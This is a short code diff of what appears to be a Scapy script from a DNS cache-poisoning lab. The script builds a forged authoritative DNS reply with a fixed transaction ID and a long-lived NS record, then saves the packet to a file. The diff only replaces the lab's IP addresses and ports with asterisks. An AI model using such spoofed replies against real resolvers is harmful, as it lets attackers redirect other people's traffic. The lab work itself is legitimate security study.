@@ -10,8 +10,8 @@ NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
 dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
 qdcount=1, ancount=1, nscount=1, arcount=0,
 qd=Qdsec, an=Anssec, ns=NSsec)
-ip = IP(dst='10.10.30.7', src='10.10.40.40')
-udp = UDP(dport=33333, sport=53, chksum=0)
+ip = IP(dst='********', src='********')
+udp = UDP(dport=*****, sport=*****, chksum=0)
 reply = ip/udp/dns
 with open ('ip_rep.bin', 'wb') as f:
     f.write(bytes(reply))
